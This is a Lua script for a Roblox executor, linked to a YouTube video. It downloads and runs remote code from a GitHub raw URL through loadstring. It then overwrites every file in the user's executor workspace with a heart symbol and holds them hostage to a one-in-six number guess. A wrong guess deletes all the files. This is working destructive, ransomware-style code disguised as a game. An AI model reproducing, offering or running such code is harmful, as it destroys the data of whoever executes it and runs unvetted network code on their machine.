
-- https://youtu.be/JodGxaHePOc

local path = "LuaV/LuaV.lua"; if not(getgenv().luav) then if isfile(path) then loadstring(readfile(path))() else
local data = game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/all/refs/heads/main/LuaV")
writefile(path, data); loadstring(data)() end end; path = nil

local text = "♥"
local paths, files = ltf(""), LuaV({})
local all_paths, all_files, count = #paths, 0, 0
local done, t = false

cclear()
ctitle("Loading...")

for i, path in paths do
	path = path:gsub("[.]", "", 1) 
	path = path:gsub("[/]", "", 1)
	if isf(path) then
		all_files = all_files + 1
		files:i(path)
		cprint("Loaded: "..all_files.."/"..all_paths)
	end
end

cclear()
all_paths, paths = nil, nil

for i, path in files do
	task.defer(function()
		local save = read(path)
		write(path, text)
		count = count + 1
		cprint(path.." crypted")
		ctitle("crypting: "..count.."/"..all_files)
		while not(done) do qw() end; qw(3)
		if t then
			write(path, save)
			count = count + 1
			cprint(path.." restored")
			ctitle("restoreting: "..count.."/"..all_files)
		else
			del(path); save = nil
			count = count + 1
			cprint(path.." deleted")
			ctitle("deleting: "..count.."/"..all_files)
		end
	end)
end

while count ~= all_files do qw() end; qw(2)
cclear()
cprint("Hello!")
cprint("ur workspace is '"..text.."'")
cprint("guess number from 1 to 6")

local input = cinput()[1]
local num = str(math.random(1, 6))[1]

if input == num then
	cprint("u win!")
	count, done, t = 0, true, true
else
	cprint("u lose!")
	cprint("answer: "..num)
	count, done, t = 0, true, false
end

while count ~= all_files do qw() end; cprint("goodbye")

